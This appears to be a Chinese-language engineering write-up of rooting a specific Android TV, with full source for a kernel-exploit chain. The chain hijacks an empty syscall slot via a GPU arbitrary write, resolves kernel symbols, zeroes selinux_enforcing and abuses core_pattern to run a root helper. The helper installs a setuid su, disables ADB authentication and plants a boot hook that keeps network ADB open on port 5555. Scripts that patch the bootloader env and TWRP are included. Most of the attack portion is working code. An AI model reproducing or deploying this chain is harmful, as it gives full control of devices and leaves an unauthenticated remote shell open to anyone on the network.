 * Modes (the table entry must already point at the matching function):
 *   kfunc sym  <name>            kallsyms_lookup_name(name)   -> prints address
 *   kfunc zero <addr_hex> <len>  memcpy(addr, zeros, len)
 *   kfunc str  <addr_hex> <text> memcpy(addr, text, len+1)
 *   kfunc show <addr_hex> <len>  memcpy(buf, addr, len)       -> hexdump
 *   kfunc scan <start> <end> [chunk] [pat1 pat2 ...]
 *                                槽位 = copy_to_user：逐块拷入用户态搜索字符串。
 *                                copy_to_user 对源/目标侧 fault 都有异常表保护，
 *                                扫到未映射/安全内存只返回未拷贝字节数，不会 panic。
 *   kfunc dump <addr> <len> <outfile>
 *                                槽位 = copy_to_user：把内核内存导出为文件。
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define SLOT 244

static unsigned char buf[8192];
static unsigned char src[8192];

static unsigned long call3(unsigned long a0, unsigned long a1, unsigned long a2)
{
    return (unsigned long)syscall(SLOT, a0, a1, a2);
}

/* ---- scan：槽位 = copy_to_user 时的 DRAM 扫描器 ----
 * copy_to_user(to, from, n) 返回未拷贝字节数（0 = 全部成功）。
 * 源侧 fault 走异常表 fixup，不会 panic —— 这是选它而不选 memcpy 的原因。 */
static int mode_scan(int argc, char **argv)
{
    if (argc < 5) return 1;
    unsigned long start = strtoul(argv[2], NULL, 16);
    unsigned long end   = strtoul(argv[3], NULL, 16);
    unsigned long chunk = (argc >= 6) ? strtoul(argv[4], NULL, 16) : 0x100000;
    const char *pats[8];
    int np = 0;
    for (int i = 5; i < argc && np < 8; i++) pats[np++] = argv[i];
    if (np == 0) {
        pats[np++] = "U-Boot 20";      /* bl33 banner rodata */
        pats[np++] = "bootargs";       /* env 处理字符串 */
        pats[np++] = "storeargs";
        pats[np++] = "DRAM: ";
    }
    if (chunk < 0x1000) chunk = 0x1000;
    if (chunk > 0x400000) chunk = 0x400000;
    if (end <= start || end - start > 0x80000000UL) return 1;

    unsigned char *big = mmap(NULL, chunk, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (big == MAP_FAILED) { fprintf(stderr, "mmap failed\n"); return 1; }
    /* 关键：必须先在用户态触碰全部页，把物理页分配出来。
     * probe_kernel_read 在 pagefault_disable 下执行，缓冲区缺页会在内核态
     * 直接 oops（实测第一次跑就是这里 panic 重启的）。 */
    memset(big, 0, chunk);

    unsigned long hits = 0, scanned = 0, skipped = 0;
    for (unsigned long va = start; va + chunk <= end; va += chunk) {
        unsigned long r = call3((unsigned long)big, va, chunk);
        if (r != 0) {
            skipped++;
            continue;
        }
        scanned += chunk;
        for (int p = 0; p < np; p++) {
            size_t pl = strlen(pats[p]);
            unsigned char *q = big, *e = big + chunk;
            while (q && (size_t)(e - q) >= pl) {
                q = memmem(q, (size_t)(e - q), pats[p], pl);
                if (!q) break;
                unsigned long hva = va + (unsigned long)(q - big);
                printf("HIT '%s' @ va=0x%016lx phys=0x%lx\n",
                       pats[p], hva, hva - 0xffffffc000000000UL);
                printf("     ctx: ");
                for (int k = -8; k < 56; k++) {
                    long idx = (long)(q - big) + k;
                    if (idx >= 0 && idx < (long)chunk)
                        putchar((big[idx] >= 32 && big[idx] < 127) ? big[idx] : '.');
                }
                printf("\n");
                hits++;
                q += pl;
            }
        }
        if (((va - start) / chunk) % 32 == 31)
            printf("... scanned %luMB hits=%lu skipped=%lu\n",
                   scanned >> 20, hits, skipped);
    }
    printf("scan done: scanned=%luMB skipped=%lu hits=%lu\n",
           scanned >> 20, skipped, hits);
    munmap(big, chunk);
    return hits ? 0 : 2;
}

/* ---- dump：槽位 = copy_to_user 时的内存导出 ---- */
static int mode_dump(int argc, char **argv)
{
    if (argc < 5) return 1;
    unsigned long va  = strtoul(argv[2], NULL, 16);
    unsigned long len = strtoul(argv[3], NULL, 16);
    const char *out   = argv[4];
    if (len == 0 || len > 0x2000000UL) return 1;   /* 上限 32MB */

    unsigned long piece = 0x100000;
    unsigned char *big = mmap(NULL, piece, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (big == MAP_FAILED) { fprintf(stderr, "mmap failed\n"); return 1; }
    memset(big, 0, piece);   /* 同 scan：先在用户态把页分配好 */
    FILE *f = fopen(out, "wb");
    if (!f) { fprintf(stderr, "open %s failed\n", out); return 1; }

    unsigned long ok = 0;
    for (unsigned long off = 0; off < len; off += piece) {
        unsigned long n = (len - off > piece) ? piece : (len - off);
        unsigned long r = call3((unsigned long)big, va + off, n);
        if (r != 0) {
            printf("dump skip: 0x%016lx (uncopyable %lu)\n", va + off, r);
            memset(big, 0, n);
        } else {
            ok += n;
        }
        fwrite(big, 1, n, f);
    }
    fclose(f);
    munmap(big, piece);
    printf("dump done: %s, %lu/%lu bytes readable\n", out, ok, len);
    return ok ? 0 : 2;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc >= 2 && !strcmp(argv[1], "scan")) return mode_scan(argc, argv);
    if (argc >= 2 && !strcmp(argv[1], "dump")) return mode_dump(argc, argv);
    if (argc < 2) {
        fprintf(stderr, "usage: see source header\n");
        return 1;
    }

    if (!strcmp(argv[1], "sym") && argc >= 3) {
        char name[128];
        strncpy(name, argv[2], sizeof name - 1);
        name[sizeof name - 1] = 0;
        unsigned long a = call3((unsigned long)name, 0, 0);
        printf("%s = 0x%016lx\n", name, a);
        return (a > 0xffffff0000000000UL) ? 0 : 2;
    }

    if (!strcmp(argv[1], "zero") && argc >= 4) {
        unsigned long dst = strtoul(argv[2], NULL, 16);
        int len = atoi(argv[3]);
        if (len <= 0 || len > (int)sizeof src) return 1;
        memset(src, 0, len);
        unsigned long r = call3(dst, (unsigned long)src, (unsigned long)len);
        printf("memset-ish 0x%lx <- 0 (%d bytes), ret=0x%lx\n", dst, len, r);
        return 0;
    }

    if (!strcmp(argv[1], "str") && argc >= 4) {
        unsigned long dst = strtoul(argv[2], NULL, 16);
        int len = (int)strlen(argv[3]) + 1;
        if (len > (int)sizeof src) return 1;
        memcpy(src, argv[3], len);
        unsigned long r = call3(dst, (unsigned long)src, (unsigned long)len);
        printf("memcpy 0x%lx <- \"%s\" (%d bytes), ret=0x%lx\n", dst, argv[3], len, r);
        return 0;
    }

    if (!strcmp(argv[1], "show") && argc >= 4) {
        unsigned long src_addr = strtoul(argv[2], NULL, 16);
        int len = atoi(argv[3]);
        if (len <= 0 || len > (int)sizeof buf) return 1;
        memset(buf, 0, sizeof buf);
        call3((unsigned long)buf, src_addr, (unsigned long)len);
        for (int i = 0; i < len; i++) {
            printf("%02x", buf[i]);
            if ((i & 15) == 15) printf("\n");
        }
        if (len & 15) printf("\n");
        return 0;
    }

    fprintf(stderr, "unknown mode\n");
    return 1;
}
```

> 注意：`probe_kernel_read` 在 arm64 3.14 上不在 kallsyms 导出（内联实现），运行期解析要用
> 符号表里的弱符号地址；`copy_to_user` 同样是内联的，不要按 x86 的习惯去找它。

### su.c 和 setcap.c

```c
/* su.c — 极简 su：suid 位提升 euid 到 0 后起 shell */
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

int main(int argc, char **argv)
{
    gid_t g = 0;
    if (setgroups(1, &g) == 0 && setgid(0) == 0 && setuid(0) == 0 && getuid() == 0) {
        /* 真实 root */
    } else if (geteuid() == 0) {
        fprintf(stderr, "[su] euid 提升成功\n");
    } else {
        fprintf(stderr, "su: 提权失败: %s\n", strerror(errno));
        return 1;
    }
    if (argc > 1 && !strcmp(argv[1], "-c") && argc > 2) {
        execl("/system/bin/sh", "sh", "-c", argv[2], NULL);
        return 127;
    }
    if (argc > 1) {
        execv(argv[1], &argv[1]);
        return 127;
    }
    execl("/system/bin/sh", "sh", NULL);
    return 127;
}
```

```c
/* setcap.c — 为 su 写入 security.capability xattr（VFS_CAP_REVISION_2），
 * fP = CAP_SETGID|CAP_SETUID。本机内核不支持 file caps，写了不会生效但也无害；
 * 在支持 file caps 的内核上这一步能让 su 拿到完整 capability。 */
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/xattr.h>
#include <stdint.h>

int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr, "用法: %s <su路径>\n", argv[0]); return 1; }
    unsigned char buf[20];
    memset(buf, 0, sizeof buf);
    *(uint32_t *)(buf + 0)  = 0x02000001u; /* REV_2 | EFFECTIVE */
    *(uint32_t *)(buf + 4)  = 0xC0u;       /* permitted = SETGID|SETUID */
    *(uint32_t *)(buf + 8)  = 0;           /* inheritable */
    *(uint32_t *)(buf + 12) = 0xC0u;
    *(uint32_t *)(buf + 16) = 0;
    if (setxattr(argv[1], "security.capability", buf, sizeof buf, 0) < 0) {
        fprintf(stderr, "setxattr: %s\n", strerror(errno));
        return 1;
    }
    printf("file caps: %s\n", argv[1]);
    return 0;
}
```

### httpd.c（自研静态文件服务器）

市面上能拿到的安卓 busybox（recovery 裁剪版 / TWRP 版 / busybox.net 官方预编译 / busybox-ndk）
全部不含 httpd，而文件服务器是刚需，于是自己写了一个：约 150 行 C，zig cc 编成 armv7 静态
二进制（约 892KB），放 /data 持久分区，由 init 服务开机拉起。功能刚好够用：

- GET 静态文件 + 目录列表（`%xx` URL 解码、HTML 转义、路径穿越拒绝）
- 按扩展名给 Content-Type
- 单线程顺序应答，无并发压力场景足够

```c
/* httpd.c - minimal static file server for the xmen TV (armv7 static, musl)
 * Usage: httpd <port> <docroot>
 * Features: GET only, dir listing, .. rejection, %xx url decode
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <dirent.h>
#include <sys/stat.h>

static void url_decode(char *s) {
    char *w = s;
    for (; *s; s++) {
        if (*s == '%' && s[1] && s[2]) {
            char h[3] = { s[1], s[2], 0 };
            *w++ = (char)strtol(h, NULL, 16);
            s += 2;
        } else if (*s == '+') {
            *w++ = ' ';
        } else {
            *w++ = *s;
        }
    }
    *w = 0;
}

static void html_escape(const char *in, char *out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j + 8 < n; i++) {
        if (in[i] == '<') { memcpy(out+j, "&lt;", 4); j += 4; }
        else if (in[i] == '>') { memcpy(out+j, "&gt;", 4); j += 4; }
        else if (in[i] == '&') { memcpy(out+j, "&amp;", 5); j += 5; }
        else out[j++] = in[i];
    }
    out[j] = 0;
}

static void href_encode(const char *in, char *out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j + 4 < n; i++) {
        unsigned char c = (unsigned char)in[i];
        if (c == ' ' || c == '%' || c == '"' || c == '#' || c == '?' ||
            (c > 0 && c < 32)) {
            j += snprintf(out+j, n-j, "%%%02X", c);
        } else {
            out[j++] = (char)c;
        }
    }
    out[j] = 0;
}

static const char *ctype(const char *p) {
    const char *e = strrchr(p, '.');
    if (!e) return "application/octet-stream";
    if (!strcmp(e, ".html") || !strcmp(e, ".htm")) return "text/html";
    if (!strcmp(e, ".css")) return "text/css";
    if (!strcmp(e, ".js"))  return "text/javascript";
    if (!strcmp(e, ".txt") || !strcmp(e, ".log") || !strcmp(e, ".prop")) return "text/plain";
    if (!strcmp(e, ".png")) return "image/png";
    if (!strcmp(e, ".jpg") || !strcmp(e, ".jpeg")) return "image/jpeg";
    if (!strcmp(e, ".gif")) return "image/gif";
    if (!strcmp(e, ".mp4")) return "video/mp4";
    if (!strcmp(e, ".apk")) return "application/vnd.android.package-archive";
    return "application/octet-stream";
}

int main(int argc, char **argv) {
    int port = argc > 1 ? atoi(argv[1]) : 8080;
    const char *root = argc > 2 ? argv[2] : "/sdcard";

    int s = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, 4);
    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = INADDR_ANY;
    a.sin_port = htons((unsigned short)port);
    if (bind(s, (struct sockaddr *)&a, sizeof a) < 0) { perror("bind"); return 1; }
    listen(s, 8);

    char req[4096], path[1024];
    for (;;) {
        int c = accept(s, 0, 0);
        if (c < 0) continue;
        int n = read(c, req, sizeof req - 1);
        if (n <= 0) { close(c); continue; }
        req[n] = 0;
        if (strncmp(req, "GET ", 4)) { close(c); continue; }
        char *p = req + 4;
        char *e = strchr(p, ' ');
        if (!e) { close(c); continue; }
        *e = 0;
        url_decode(p);
        if (strstr(p, "..")) {   /* path traversal: reject */
            write(c, "HTTP/1.0 403 Forbidden\r\nConnection: close\r\n\r\n", 45);
            close(c); continue;
        }
        if (p[strlen(p)-1] == '/') p[strlen(p)-1] = 0;   /* normalize */
        snprintf(path, sizeof path, "%s%s", root, p[0] ? p : "/");

        struct stat st;
        if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
            DIR *dd = opendir(path);
            if (!dd) {
                write(c, "HTTP/1.0 404 Not Found\r\nConnection: close\r\n\r\n", 45);
                close(c); continue;
            }
            char body[131072];
            int bi = snprintf(body, sizeof body,
                "<html><head><meta charset=\"utf-8\"><title>Index %s</title></head>"
                "<body><h2>%s</h2><hr><pre>", p, p);
            struct dirent *de;
            char esc[512], href[512];
            while ((de = readdir(dd))) {
                if (!strcmp(de->d_name, ".")) continue;
                char full[1200];
                snprintf(full, sizeof full, "%s/%s", path, de->d_name);
                struct stat s2;
                int isdir = (stat(full, &s2) == 0 && S_ISDIR(s2.st_mode));
                html_escape(de->d_name, esc, sizeof esc);
                char rel[600];
                snprintf(rel, sizeof rel, "%s/%s", p, de->d_name);
                href_encode(rel, href, sizeof href);
                bi += snprintf(body+bi, sizeof body-bi,
                    "<a href=\"%s%s\">%-48s %s</a><br>",
                    href, isdir ? "/" : "", esc, isdir ? "[DIR]" : "");
                if (bi > (int)sizeof body - 2048) break;
            }
            closedir(dd);
            bi += snprintf(body+bi, sizeof body-bi, "</pre><hr>httpd for xmen</body></html>");
            char hdr[192];
            int hl = snprintf(hdr, sizeof hdr,
                "HTTP/1.0 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n"
                "Content-Length: %d\r\nConnection: close\r\n\r\n", bi);
            write(c, hdr, hl);
            write(c, body, bi);
        } else {
            FILE *f = fopen(path, "rb");
            if (!f) {
                write(c, "HTTP/1.0 404 Not Found\r\nConnection: close\r\n\r\n", 45);
                close(c); continue;
            }
            fseek(f, 0, SEEK_END);
            long sz = ftell(f);
            fseek(f, 0, SEEK_SET);
            char hdr[256];
            int hl = snprintf(hdr, sizeof hdr,
                "HTTP/1.0 200 OK\r\nContent-Type: %s\r\nContent-Length: %ld\r\n"
                "Connection: close\r\n\r\n", ctype(path), sz);
            write(c, hdr, hl);
            char buf[16384];
            size_t r;
            while ((r = fread(buf, 1, sizeof buf, f)) > 0) {
                if (write(c, buf, r) < 0) break;
            }
            fclose(f);
        }
        close(c);
    }
    return 0;
}
```

编译：`zig cc -target arm-linux-musleabihf -O1 -static -o httpd httpd.c`

### run.sh

```sh
#!/system/bin/sh
#
# 提权链驱动：GPU 写空槽 -> kallsyms 自举 -> memcpy -> 关 SELinux -> core_pattern
#
# 固件相关常量（3396 固件实测值；其他固件用环境变量覆盖）：
#   KLN_ADDR   kallsyms_lookup_name 虚拟地址
#   SLOT_PHYS  sys_call_table[244] 物理地址
KLN_ADDR=${KLN_ADDR:-ffffffc00111f308}
SLOT_PHYS=${SLOT_PHYS:-1f737a0}

set -u
D=/data/local/tmp

say() { echo "[run] $*"; }
die() { echo "[run] FATAL: $*" >&2; exit 1; }

[ -x "$D/gpu_arb_write" ] || die "$D/gpu_arb_write missing"
[ -x "$D/kfunc" ]         || die "$D/kfunc missing"

# stage 0: 空槽 <- kallsyms_lookup_name
say "stage 0: sys_call_table[244..259] <- kallsyms_lookup_name"
"$D/gpu_arb_write" "$SLOT_PHYS" "$KLN_ADDR" || die "gpu write failed"

# stage 1: 解析符号
resolve() {
    out=$("$D/kfunc" sym "$1" 2>/dev/null) || die "cannot resolve $1"
    echo "$out" | awk -F'0x' '{print $2}' | tail -1
}

MEMCPY=$(resolve memcpy)
SELINUX_ENFORCING=$(resolve selinux_enforcing)
CORE_PATTERN=$(resolve core_pattern)
say "memcpy            = 0x$MEMCPY"
say "selinux_enforcing = 0x$SELINUX_ENFORCING"
say "core_pattern      = 0x$CORE_PATTERN"

# stage 2: 空槽 <- memcpy（任意内核读写）
say "stage 2: sys_call_table[244..259] <- memcpy"
"$D/gpu_arb_write" "$SLOT_PHYS" "$MEMCPY" || die "gpu write failed"

# stage 3: SELinux -> permissive（热变量必须 CPU 侧写）
say "stage 3: selinux_enforcing = 0"
"$D/kfunc" zero "$SELINUX_ENFORCING" 4 || die "write failed"
say "getenforce -> $(getenforce 2>/dev/null)"

# stage 4: core_pattern <- root helper
say "stage 4: core_pattern <- |$D/roothelper.sh"
"$D/kfunc" str "$CORE_PATTERN" "|$D/roothelper.sh" || die "write failed"

# stage 5: 触发 coredump，内核以 root 执行 roothelper.sh
say "stage 5: triggering coredump"
rm -f "$D/root.log"
ulimit -c unlimited 2>/dev/null
( kill -SEGV $$ ) 2>/dev/null
sleep 2

if [ -f "$D/root.log" ]; then
    say "success - helper ran as root:"
    sed 's/^/    /' "$D/root.log"
else
    say "helper did not run"
    exit 3
fi
```

### roothelper.sh（内核以 root 身份执行）

```sh
#!/system/bin/sh
# 由 core_pattern 管道 helper 以 uid=0 / u:r:kernel:s0 执行
# （capability 全量）。无 stdin/stdout，输出写 /data/local/tmp/root.log。
exec </dev/null
LOG=/data/local/tmp/root.log
exec >$LOG 2>&1

echo "=== core_pattern helper ==="
id
echo "selinux: $(getenforce 2>/dev/null)"

# 1) remount /system
mount -o rw,remount /system && echo remount_ok

# 2) 安装 setuid su（并尝试 file caps）
if [ -f /data/local/tmp/su ]; then
    cp /data/local/tmp/su /system/xbin/su
    chown 0:0 /system/xbin/su
    chmod 6755 /system/xbin/su
    [ -f /data/local/tmp/setcap ] && /data/local/tmp/setcap /system/xbin/su
    ls -l /system/xbin/su
fi

# 3) ADB 属性持久化
setprop persist.adb.tcp.port 5555
setprop service.adb.tcp.port 5555

# 4) build.prop: ro.adb.secure 1 -> 0
#    build.prop.new 由宿主机 python 字节级替换生成，
#    不要用设备端 sed 改 CRLF 文件（会产生 NUL 损坏，见注意事项）
if [ -f /sdcard/build.prop.new ]; then
    mount -o rw,remount /system
    cp /sdcard/build.prop.new /system/build.prop
    chown 0:0 /system/build.prop
    chmod 644 /system/build.prop
    grep -a "ro.adb.secure" /system/build.prop
fi

# 5) 部署开机钩子：install-recovery.sh 由 init class main 每次开机执行
#    install-recovery.sh.new2 = 接管版（ADB 常驻巡查 + 移除 applypatch 还原逻辑）
if [ -f /sdcard/install-recovery.sh.new2 ]; then
    cp /system/bin/install-recovery.sh /data/local/tmp/install-recovery.sh.orig2
    cp /sdcard/install-recovery.sh.new2 /system/bin/install-recovery.sh
    chown 0:0 /system/bin/install-recovery.sh
    chmod 750 /system/bin/install-recovery.sh
    echo "hook installed (infinite watch loop)"
fi

sync
echo "=== done ==="
```

### install-recovery.sh.new2（接管版开机钩子）

这是最终部署到 `/system/bin/install-recovery.sh` 的完整文件（不是追加段）。它做两件事：原版的 applypatch recovery 校验/还原逻辑整体移除（换了 TWRP 后必须移除，否则开机把它刷回去）；ADB 部分改成**常驻巡查循环**。

为什么必须是常驻循环：早版把开机动作放进后台子 shell，但 flash_recovery 服务主进程 0.2 秒就退出，init 清理进程组时把后台子 shell 连带杀掉，动作从未执行过（dmesg 里 `exited with status 0` 配合 adbhook.log 无记录实锤）。常驻循环让服务进程自己不退出，每 20 秒检查三处 ADB 状态，被关 20 秒内拉回，只有实际发生动作才写日志：

```sh
#!/system/bin/sh
#
# install-recovery.sh - 无限常驻检测版
# 原 applypatch 校验/还原逻辑已移除（recovery 为自定义 TWRP）。
#
# 本脚本由 init 的 flash_recovery 服务执行，进程永不退出（oneshot 服务
# 运行中即不会被 init 干预）。每 20 秒检测三处 ADB 状态，发现被关闭
# 立即拉回：settings adb_enabled、service.adb.tcp.port、sys.set_adb_disabled。
# 只有实际发生动作时才写日志，避免日志无限增长。
#
i=0
while true; do
    sleep 20
    ACT=""
    EN=$(settings get global adb_enabled 2>/dev/null)
    if [ "$EN" != "1" ]; then
        settings put global adb_enabled 1
        ACT="$ACT adb_enabled"
    fi
    P=$(getprop service.adb.tcp.port 2>/dev/null)
    if [ "$P" != "5555" ]; then
        setprop persist.adb.tcp.port 5555
        setprop service.adb.tcp.port 5555
        ACT="$ACT tcpport"
    fi
    DIS=$(getprop sys.set_adb_disabled 2>/dev/null)
    if [ "$DIS" != "false" ]; then
        setprop sys.set_adb_disabled false
        ACT="$ACT disabled_flag"
    fi
    L=$(netstat -tln 2>/dev/null | grep -c ":5555")
    if [ "$L" = "0" ]; then
        setprop ctl.restart adbd
        ACT="$ACT adbd_restart"
    fi
    i=$((i+1))
    if [ -n "$ACT" ]; then
        echo "$(date) tick$i fixed:$ACT" >> /data/local/tmp/adbhook.log
    fi
done
```

### 地址计算脚本（宿主机 Python）

**extract_kernel.py** —— 从官方固件包提取内核：

```python
# -*- coding: utf-8 -*-
"""extract_kernel.py <固件包.zip 或 boot.img> —— 提取并解压内核 Image"""
import zipfile, struct, gzip, sys

src = sys.argv[1]
if src.endswith('.zip'):
    z = zipfile.ZipFile(src)
    d = z.read('boot.img')
else:
    d = open(src, 'rb').read()

assert d[:8] == b'ANDROID!', '非 Android boot 镜像'
ks = struct.unpack('<I', d[8:12])[0]          # kernel 大小
kern = d[2048:2048 + ks]                       # kernel 数据（紧随 1KB 页头）
print('kernel magic:', kern[:4].hex())
if kern[:2] == b'\x1f\x8b':                    # gzip
    raw = gzip.decompress(kern)
else:
    raw = kern
print('解压后:', len(raw), '字节; Image 魔数(0x38 处):', raw[0x38:0x3c])  # 应为 ARMd
open('vmlinux.img', 'wb').write(raw)
```

**calc_addr.py** —— 符号地址计算与校验。思路：固件包里的内核是完整的 vmlinux，里面有 kallsyms 地址数组（起始是 `_text`，连续递增的 u64，同地址符号允许相等）；电视端的 `/proc/kallsyms` 地址全是零但符号名和顺序完整。两边一配对，每个符号的地址就都有了。数符号数量、对 `num_syms`、查空槽，三道校验过了地址才可信。

```python
# -*- coding: utf-8 -*-
"""
calc_addr.py <vmlinux.img> <设备kallsyms导出>
设备端导出:  adb shell "cat /proc/kallsyms" > kallsyms_dev.txt
"""
import struct, sys

BASE = 0xffffffc000000000          # 线性映射: va = phys + BASE
data = open(sys.argv[1], 'rb').read()
N = len(data)

# ---- 1. 定位符号地址数组 ----
cand = -1
for off in range(0x100000, N - 65536, 8):
    v = struct.unpack_from('<Q', data, off)[0]
    if BASE <= v < BASE + 0x100000000:
        ok, prev = True, v
        for k in range(1, 4096):
            nv = struct.unpack_from('<Q', data, off + 8*k)[0]
            if not (prev <= nv < BASE + 0x100000000):
                ok = False; break
            prev = nv
        if ok:
            cand = off; break
if cand == -1:
    sys.exit('未找到 kallsyms_addresses')
while cand >= 8:                    # 回溯到数组真实起点
    v = struct.unpack_from('<Q', data, cand - 8)[0]
    if BASE <= v <= struct.unpack_from('<Q', data, cand)[0] and v < BASE + 0x100000000:
        cand -= 8
    else:
        break

addrs, prev, off = [], -1, cand
while off + 8 <= N:
    v = struct.unpack_from('<Q', data, off)[0]
    if v < prev or not (BASE <= v < BASE + 0x100000000):
        break
    addrs.append(v); prev = v; off += 8

# ---- 2. num_syms ----
num_off = None
for k in range(512):
    v = struct.unpack_from('<Q', data, off + 8*k)[0]
    if v != 0:
        num_off = off + 8*k; break
num_syms = struct.unpack_from('<Q', data, num_off)[0]
assert num_syms == len(addrs), 'num_syms(%d) != 数组计数(%d)' % (num_syms, len(addrs))
print('符号数: %d, _text = 0x%x' % (len(addrs), addrs[0]))

# ---- 3. 与设备符号名按序配对 ----
names = []
for line in open(sys.argv[2], encoding='latin1'):
    p = line.split()
    if len(p) < 3 or '[' in p[-1]:   # 跳过模块符号
        continue
    names.append(p[2])
assert len(names) == len(addrs), \
    '设备纯内核符号数(%d) != 镜像地址数(%d) —— 非同一内核!' % (len(names), len(addrs))

syms = dict(zip(names, addrs))

# ---- 4. 校验 sys_call_table 空槽 ----
sct   = syms['sys_call_table']
ni    = syms['sys_ni_syscall']
text  = addrs[0]                    # _text 虚拟地址
ents  = [struct.unpack_from('<Q', data, sct - text + 8*k)[0] for k in range(320)]
assert len(set(ents[244:260])) == 1 and ents[244] == ni, '空槽校验失败'
print('sys_call_table[244..259] 空槽校验通过')

# ---- 5. 输出 ----
out = {
    'KLN_ADDR':  syms['kallsyms_lookup_name'],
    'SLOT_PHYS': sct + 244*8 - BASE,
    'selinux_enforcing': syms['selinux_enforcing'],
    'core_pattern':      syms['core_pattern'],
    'memcpy':            syms['memcpy'],
}
with open('syms.txt', 'w') as f:
    for n, a in zip(names, addrs):
        f.write('%016x %s\n' % (a, n))
for k, v in out.items():
    print('%-20s = %x' % (k, v))
```

**patch_env.py** —— SELinux 源头禁用：

```python
# -*- coding: utf-8 -*-
"""
patch_env.py <env_backup.bin>
从设备导出:  adb shell "su -c 'dd if=/dev/block/env of=/sdcard/env_backup.bin bs=262144'"
             adb pull /sdcard/env_backup.bin env_backup.bin
流程:
  1. 以头部 CRC32 试算确定 ENV_SIZE;
  2. initargs 中 androidboot.selinux=enforcing -> permissive;
  3. 重算 CRC 写回头部, 输出 env_new.bin。
"""
import zlib, struct, sys

d = bytearray(open(sys.argv[1], 'rb').read())
crc_stored = struct.unpack('<I', d[:4])[0]
print('头部 CRC = 0x%08x' % crc_stored)

env_size = None
for size in [0x1000,0x2000,0x4000,0x8000,0x10000,0x20000,0x40000,0x80000]:
    if zlib.crc32(bytes(d[4:size])) & 0xffffffff == crc_stored:
        env_size = size; break
assert env_size, 'CRC 未匹配任何候选长度'
print('ENV_SIZE = 0x%x' % env_size)

old = b'androidboot.selinux=enforcing'
new = b'androidboot.selinux=permissive'
assert d.count(old) == 1, 'initargs 中 selinux 值定位异常'
i = d.find(old)
d[i:i+len(old)] = new

crc = zlib.crc32(bytes(d[4:env_size])) & 0xffffffff
d[0:4] = struct.pack('<I', crc)
open('env_new.bin', 'wb').write(bytes(d))
print('新 CRC = 0x%08x, 已输出 env_new.bin' % crc)
```

**rebuild_twrp.py** —— TWRP 补丁流水线（完整代码在 `scripts/rebuild_twrp.py`）。解包 TWRP 的 ramdisk（gzip + cpio newc，纯 Python 手写解析，宿主机无需 cpio 工具），把里面的 `systemcontrol_static`（Amlogic ubootenv 管理工具，`sbin/` 和 `twrp/sbin/` 下各一份）替换为空脚本，按 newc 格式重建 cpio、gzip 压缩、严格页对齐重打包 boot 镜像，最后重新解包自检：

```bash
python scripts/rebuild_twrp.py twrp.img     # 输出 twrp_patched.img，含自检
```

自检不过（找不到 systemcontrol_static）就停下，不要把未打补丁的 TWRP 刷进 recovery。

```python
# -*- coding: utf-8 -*-
"""
rebuild_twrp.py <twrp.img>

TWRP 补丁流水线：把 TWRP ramdisk 里的 systemcontrol_static（sbin/ 和 twrp/sbin/
下的同名文件，Amlogic ubootenv 管理工具）替换为空脚本。

为什么必须打补丁：
  TWRP 会话期间 systemcontrol_static 会加载 env 属性并把官方默认值写回 env 分区，
  导致 env 里的 androidboot.selinux=permissive 被抹掉、root 持久化被破坏。
  实测：未打补丁的 TWRP 进出一次，env 即被改回 enforcing；打补丁后进出 TWRP
  env 保持不变。

输出 twrp_patched.img，含解包自检。TWRP 其余功能不受影响。
"""
import struct, gzip, hashlib, sys

src = sys.argv[1]
img = open(src, 'rb').read()
assert img[:8] == b'ANDROID!', '非 Android boot 镜像'

ks = struct.unpack('<I', img[8:12])[0]      # kernel size
ds = struct.unpack('<I', img[16:20])[0]     # ramdisk size
ss = struct.unpack('<I', img[32:36])[0]     # second size
ps = struct.unpack('<I', img[36:40])[0]     # page size
k_pages = (ks + ps - 1) // ps
rd_off  = 2048 + k_pages * ps
sec_off = rd_off + (ds + ps - 1) // ps * ps
kernel  = img[2048:2048 + ks]
second  = img[sec_off:sec_off + ss] if ss else b''

# ---- 1. 解压 ramdisk ----
rd = img[rd_off:rd_off + ds]
if rd[:2] == b'\x1f\x8b':
    rd = gzip.decompress(rd)
print('ramdisk(cpio): %d 字节' % len(rd))

# ---- 2. 解析 cpio (newc 格式) ----
d = rd
off, entries = 0, []
while off < len(d):
    if d[off:off+6] != b'070701':
        t = d.find(b'070701', off)
        if t == -1:
            break
        off = t
        continue
    f = [int(d[off+6+i*8:off+14+i*8], 16) for i in range(13)]
    mode, uid, gid = f[1], f[2], f[3]
    namesize, filesize = f[11], f[6]
    name = d[off+110:off+110+namesize-1].decode('latin1')
    data_off = (off + 110 + namesize + 3) & ~3
    data = d[data_off:data_off + filesize]
    if name == 'TRAILER!!!':
        break
    entries.append((name, mode, uid, gid, data))
    off = data_off + filesize
    off = (off + 3) & ~3
print('cpio 条目数: %d' % len(entries))

# ---- 3. 中性化 systemcontrol_static ----
NOOP = b'#!/system/bin/sh\n# systemcontrol disabled: prevent ubootenv overwrite\nexit 0\n'
patched = 0
for i, (name, mode, uid, gid, data) in enumerate(entries):
    if name.endswith('systemcontrol_static'):
        entries[i] = (name, 0o100750, uid, gid, NOOP)
        patched += 1
        print('替换: %s' % name)
if patched == 0:
    sys.exit('未找到 systemcontrol_static —— 该镜像无需补丁或结构不同，停止')

# ---- 4. 重建 cpio ----
def pad4(b):
    return b + b'\x00' * ((4 - len(b) % 4) % 4)

out_cpio = b''
for name, mode, uid, gid, data in entries:
    nb = name.encode('latin1') + b'\x00'
    hdr = b'070701' + ''.join('%08X' % v for v in
